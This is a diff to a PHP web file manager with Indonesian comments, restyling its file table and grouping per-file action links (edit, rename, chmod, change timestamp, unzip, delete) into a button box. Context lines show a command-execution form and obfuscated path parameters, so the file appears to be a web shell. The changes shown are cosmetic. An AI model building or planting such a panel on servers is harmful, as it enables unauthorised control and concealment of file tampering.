@@ -235,33 +235,53 @@
         color: #ffffff;
     }
     
-    /* Table Dark Theme */
+    /* ===== TABLE STYLES - DENGAN GARIS PINGGIR ===== */
     .table {
         color: #ffffff;
         background-color: #2d2d2d;
-        border-collapse: collapse;
         width: 100%;
         margin-bottom: 30px;
+        border-collapse: separate;
+        border-spacing: 0;
+        border: 2px solid #007bff;
+        border-radius: 8px;
+        overflow: hidden;
     }
+
+    /* Header dengan background kuning */
     .table thead th {
         background-color: #ffc107 !important;
         color: #000000 !important;
         font-weight: bold;
-        border: 1px solid #007bff;
+        padding: 12px 15px;
+        border: none;
+        border-bottom: 2px solid #007bff;
         position: sticky;
         top: 0;
         z-index: 10;
     }
-    .table tbody tr {
-        border: 1px solid #007bff;
+
+    /* Body rows - hanya border horizontal */
+    .table tbody tr td {
+        border-bottom: 1px solid #007bff;
+        padding: 12px 15px;
+        vertical-align: middle;
+        border: none;
+        border-bottom: 1px solid #007bff;
     }
+
+    .table tbody tr:last-child td {
+        border-bottom: none;
+    }
+
     .table tbody tr:hover {
         background-color: #3d3d3d;
     }
+
+    /* Hilangkan border kanan dan kiri */
     .table td, .table th {
-        border: 1px solid #007bff;
-        padding: 12px;
-        vertical-align: middle;
+        border-left: none;
+        border-right: none;
     }
     
     /* Hover effects untuk Name, Size, Modified, dan Owner */
@@ -311,24 +331,76 @@
         font-weight: bold; 
     }
     
-    /* Action Icons */
-    .table td a i {
-        color: #ffffff;
-        margin: 0 5px;
-        font-size: 1.1em;
-        transition: color 0.2s ease;
-    }
-    .table td a i:hover {
-        color: #ffc107 !important;
-    }
-    
-    /* Icon kunci spesifik */
-    .table td a i.fa-key {
-        color: #ffffff;
-    }
-    .table td a i.fa-key:hover {
-        color: #ffc107 !important;
-    }
+ /* Action Icons - Dalam Satu Kotak dengan Pemisah Garis Full */
+.table td:last-child {
+    white-space: nowrap;
+    text-align: center;
+}
+
+.table td:last-child .action-buttons {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #3d3d3d;
+    border: 1px solid #ffffff;
+    border-radius: 6px;
+    padding: 0;
+    overflow: hidden;
+}
+
+.table td:last-child .action-buttons a {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    color: #ffffff;
+    padding: 6px 8px;
+    line-height: 1;
+    position: relative;
+    transition: all 0.2s ease;
+}
+
+.table td:last-child .action-buttons a:not(:last-child)::before {
+    content: "";
+    position: absolute;
+    right: 0;
+    top: 0;
+    height: 100%;
+    width: 1px;
+    background-color: #ffffff;
+}
+
+.table td:last-child .action-buttons a i {
+    color: #ffffff;
+    font-size: 1.1em;
+    transition: color 0.2s ease;
+    margin: 0;
+}
+
+/* Hover effect per tombol */
+.table td:last-child .action-buttons a:hover {
+    background-color: #ffc107;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+}
+
+.table td:last-child .action-buttons a:hover i {
+    color: #000000 !important;
+}
+
+/* Warna khusus untuk tombol delete saat hover */
+.table td:last-child .action-buttons a:hover i.fa-trash {
+    color: #f44336 !important;
+}
+
+/* Warna khusus untuk tombol unzip saat hover */
+.table td:last-child .action-buttons a:hover i.fa-file-zipper {
+    color: #000000 !important;
+}
+
+/* Garis pemisah berubah warna saat hover */
+.table td:last-child .action-buttons a:hover::before {
+    background-color: #b38f00;
+}
     
     /* Form Dark Theme */
     .date-picker-form, .create-folder-form, .upload-form, .rename-form, .create-file-form, .cmd-form, .chmod-form {
@@ -617,13 +689,13 @@
         text-align: left;
     }
 
-/* Mengatur lebar kolom */
-.table th:nth-child(1), .table td:nth-child(1) { width: 35%; }  /* Name */
-.table th:nth-child(2), .table td:nth-child(2) { width: 10%; }  /* Size */
-.table th:nth-child(3), .table td:nth-child(3) { width: 20%; }  /* Modified */
-.table th:nth-child(4), .table td:nth-child(4) { width: 15%; }  /* Owner */
-.table th:nth-child(5), .table td:nth-child(5) { width: 8%; }   /* Perms */
-.table th:nth-child(6), .table td:nth-child(6) { width: 12%; }  /* Actions */
+    /* Mengatur lebar kolom */
+    .table th:nth-child(1), .table td:nth-child(1) { width: 25%; }  /* Name */
+    .table th:nth-child(2), .table td:nth-child(2) { width: 10%; }  /* Size */
+    .table th:nth-child(3), .table td:nth-child(3) { width: 20%; }  /* Modified */
+    .table th:nth-child(4), .table td:nth-child(4) { width: 15%; }  /* Owner */
+    .table th:nth-child(5), .table td:nth-child(5) { width: 8%; }   /* Perms */
+    .table th:nth-child(6), .table td:nth-child(6) { width: 22%; }  /* Actions - diperlebar untuk kotak */
     
     /* Responsive */
     @media (max-width: 768px) {
@@ -651,8 +723,19 @@
         .path-info {
             flex-wrap: wrap;
         }
+        
+        /* Responsive table */
+        .table th:nth-child(1), .table td:nth-child(1) { width: 35%; }
+        .table th:nth-child(6), .table td:nth-child(6) { width: 30%; }
+        .table td:last-child .action-buttons a {
+            padding: 4px 6px;
+        }
+        .table td:last-child .action-buttons a i {
+            font-size: 0.9em;
+        }
     }
 </style>
+    
 </head>
 
 <body>
@@ -1453,6 +1536,7 @@ if (isset($_GET['d']) && isset($_GET['q'])) {
         }
     }
 }
+
 // Tampilkan tabel file hanya jika tidak ada form action yang aktif
 if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfile']) && !isset($_GET['upxc']) && !isset($_GET['r']) && !isset($_GET['t']) && !isset($_GET['e']) && !isset($_GET['cmd']) && !isset($_GET['chmod'])) {
     echo '<div class="main-container">';
@@ -1510,10 +1594,12 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
       <td>" . $owner_info . "</td>
       <td><span class='{$color_class}'>" . $perms . "</span></td>
       <td>
-        <a title='Ubah Tanggal' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-regular fa-calendar'></i></a>
-        <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
-        <a title='Chmod' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . urlencode($folder) . "'><i class='fa-solid fa-key'></i></a>
-        <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>
+        <div class='action-buttons'>
+            <a title='Ubah Tanggal' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-regular fa-calendar'></i></a>
+            <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
+            <a title='Chmod' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . urlencode($folder) . "'><i class='fa-solid fa-key'></i></a>
+            <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>
+        </div>
       </td>
     </tr>
 ";
@@ -1537,16 +1623,18 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
         }
         
         $actions = '
-        <a title="Edit File" href="?q=' . urlencode(encodePath(PATH)) . '&e=' . urlencode($file) . '"><i class="fa-solid fa-file-pen"></i></a>
-        <a title="Rename" href="?q=' . urlencode(encodePath(PATH)) . '&r=' . urlencode($file) . '"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
-        <a title="Ubah Tanggal" href="?q=' . urlencode(encodePath(PATH)) . '&t=' . urlencode($file) . '"><i class="fa-regular fa-calendar"></i></a>
-        <a title="Chmod" href="?q=' . urlencode(encodePath(PATH)) . '&chmod=' . urlencode($file) . '"><i class="fa-solid fa-key"></i></a>';
+        <div class="action-buttons">
+            <a title="Edit File" href="?q=' . urlencode(encodePath(PATH)) . '&e=' . urlencode($file) . '"><i class="fa-solid fa-file-pen"></i></a>
+            <a title="Rename" href="?q=' . urlencode(encodePath(PATH)) . '&r=' . urlencode($file) . '"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
+            <a title="Ubah Tanggal" href="?q=' . urlencode(encodePath(PATH)) . '&t=' . urlencode($file) . '"><i class="fa-regular fa-calendar"></i></a>
+            <a title="Chmod" href="?q=' . urlencode(encodePath(PATH)) . '&chmod=' . urlencode($file) . '"><i class="fa-solid fa-key"></i></a>';
         
         if ($ext == 'zip') {
-            $actions .= '<a title="Unzip" href="?q=' . urlencode(encodePath(PATH)) . '&u=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i></a>';
+            $actions .= '<a title="Unzip" href="?q=' . urlencode(encodePath(PATH)) . '&u=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper"></i></a>';
         }
         
-        $actions .= '<a title="Delete" href="?q=' . urlencode(encodePath(PATH)) . '&d=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin menghapus file ini?\')"><i class="fa fa-trash" aria-hidden="true"></i></a>';
+        $actions .= '<a title="Delete" href="?q=' . urlencode(encodePath(PATH)) . '&d=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin menghapus file ini?\')"><i class="fa fa-trash" aria-hidden="true"></i></a>
+        </div>';
         
         echo "    <tr>
           <td>" . fileIcon($file) . "<a href='?q=" . urlencode(encodePath(PATH)) . "&e=" . urlencode($file) . "' class='file-name-link'>" . $file . "</a></td>
